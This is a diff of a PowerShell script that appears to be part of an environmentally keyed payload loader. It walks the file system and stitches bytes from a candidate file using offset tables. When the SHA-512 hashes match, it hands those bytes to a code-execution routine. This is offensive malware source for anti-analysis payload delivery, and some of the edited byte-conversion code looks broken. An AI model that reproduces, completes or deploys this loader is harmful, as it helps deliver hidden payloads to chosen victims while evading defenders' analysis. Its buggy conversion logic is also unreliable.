@@ -29,24 +29,32 @@ function Get-R-Done($some_file, $small_table,$full_table, $payload_hash ,$iternu
     "[*] Hash Iterations: " + $iteration_temp
         
     # open file
-    "[*] File: ", $some_file
+    "[*] File: " + $some_file
     try {{
-        #does it really read the entire file ???
         $read_file = [System.IO.File]::ReadAllBytes($some_file)
-        #grumble: we will have to skip the first byte now :( since this fails otherwise
-        [Byte[]] $tmpstitchCheck = 0x41
+        $tLoc = 0
+        $tsize = 0
+        [Byte[]] $tmpstitchCheck = @()
         $itr = 0
         #WTF powershell inclusive arrays too
         while($itr -lt $small_table.Length){{
-            $small_table[$itr..($itr+2)]
-            $small_table[($itr+3)..($itr+3)]
-            $tLoc = [bitconverter]::ToInt32($small_table[$itr..($itr+2)], 0) 
-            $tsize = [bitconverter]::ToInt16($small_table[($itr+3)..($itr+3)], 0)
-            $tmpstitchCheck += $small_table[$tLoc..($tLoc+$tsize-1)]
+            $rLoc =  ([Byte[]] $small_table[$itr..($itr+2)]) + [Byte[]] 0x00
+            $rSz =   ([Byte[]] $small_table[($itr+3)]) + [Byte[]] 0x00
+            "[*] Raw Location: " + $rLoc
+            "[*] Raw Size: " + $rSz
+            #$rLoc.GetType()
+            #$rSz.GetType()
+            $tLoc = [bitconverter]::ToInt32($rLoc, 16) 
+            $tsize = [bitconverter]::ToInt16($rSz, 16)
+            "[*] Converted Location: " + $tLoc
+            "[*] Converted Size: " + $tsize
+            $tmpstitchCheck += $read_file[$tLoc..($tLoc+$tsize-1)]
+            $tLoc = 0
+            $tsize = 0
             $itr+= 4
         }}
         #have to get rid of the first value inserted to create the byte array holder
-        $stitchCheck = $tmpstitchCheck[1..$tmpstitchCheck.Length]
+        $stitchCheck = $tmpstitchCheck
         #$keyvalue = $read_file[$location..($location + $key_len - 1)]
         $sha512 = new-Object System.Security.Cryptography.SHA512Managed
         
@@ -54,18 +62,7 @@ function Get-R-Done($some_file, $small_table,$full_table, $payload_hash ,$iternu
         return 0
     }}
     
-    #right now minus bytes are left out in go so i left it the same here :-/
-    while ($iteration_temp -ne 1){{
-            $keyvalue = $sha512.ComputeHash($stitchCheck)
-            $iteration_temp--
-    }}
-    
-    $keyvalue = $sha512.ComputeHash($stitchCheck)
-    #$keyvalue = [System.Convert]::ToBase64String($keyvalue[0..31])
-    "[*] Calculated Hash from File Iteration: ", $keyvalue
-    "[*] Hash to Match: ", $iternumhash
-
-   $result = $keyvalue -eq $iternumhash
+    $result = Get-CheckHash($stitchCheck, $iternumhash, $minus_bytes)
 
    ##################################################################
    #shoul have iterative function here, but not today
@@ -81,7 +78,7 @@ function Get-R-Done($some_file, $small_table,$full_table, $payload_hash ,$iternu
             #does it really read the entire file ???
             $read_file = [System.IO.File]::ReadAllBytes($some_file)
             #grumble: we will have to skip the first byte now :( since this fails otherwise
-            [Byte[]] $tmpstitchCheck = 0x41
+            [Byte[]] $tmpstitchCheck = @()
             $itr = 0
             #WTF powershell inclusive arrays too
             while($itr -lt $full_table.Length){{
@@ -89,38 +86,27 @@ function Get-R-Done($some_file, $small_table,$full_table, $payload_hash ,$iternu
                 $full_table[($itr+3)..($itr+3)]
                 $tLoc = [bitconverter]::ToInt32($full_table[$itr..($itr+2)], 0) 
                 $tsize = [bitconverter]::ToInt16($full_table[($itr+3)..($itr+3)], 0)
-                $tmpstitchCheck += $full_table[$tLoc..($tLoc+$tsize-1)]
+                $tmpstitchCheck += $read_file[$tLoc..($tLoc+$tsize-1)]
                 $itr+= 4
             }}
             #have to get rid of the first value inserted to create the byte array holder
-            $stitchCheck = $tmpstitchCheck[1..$tmpstitchCheck.Length]
-            #$keyvalue = $read_file[$location..($location + $key_len - 1)]
-            $sha512 = new-Object System.Security.Cryptography.SHA512Managed
+            $stitchCheck = $tmpstitchCheck
+            
             
         }} Catch {{
             return 0
         }}
         
-        #right now minus bytes are left out in go so i left it the same here :-/
-        while ($iteration_temp -ne 1){{
-                $keyvalue = $sha512.ComputeHash($stitchCheck)
-                $iteration_temp--
-        }}
+        $result = Get-CheckHash($stitchCheck, $payload_hash, $minus_bytes)
         
-        $keyvalue = $sha512.ComputeHash($stitchCheck)
-        #$keyvalue = [System.Convert]::ToBase64String($keyvalue[0..31])
-        "[*] Calculated Hash from File Iteration: ", $keyvalue
-        "[*] Hash to Match: ", $payload_hash
-
-       $result = $keyvalue -eq $payload_hash
 
        if ($result -eq 1){{
         "[*] Final Hashes Match"
         Get-CodeExecution $stitchCheck
 
 
-    }}
-           
+        }}
+    }}   
 }}
 
 function Get-Walk-OS($small_table,$full_table,$payload_hash,$iternumhash,$minus_bytes,$scan_dir,$key_iterations){{
